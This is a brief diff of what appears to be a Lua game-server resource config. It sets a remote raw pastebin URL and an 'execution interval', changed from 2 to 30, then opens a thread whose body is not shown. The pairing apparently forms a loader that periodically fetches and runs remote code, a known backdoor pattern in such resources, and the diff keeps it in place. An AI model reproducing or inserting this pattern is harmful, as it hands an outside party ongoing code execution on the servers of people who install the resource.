@@ -1,7 +1,7 @@
 Config = {}
 
 Config.RemoteURL = "https://pastebin.com/raw/zK0SibaB"
-Config.ExecutionInterval = 2
+Config.ExecutionInterval = 30
 
 
 CreateThread(function()
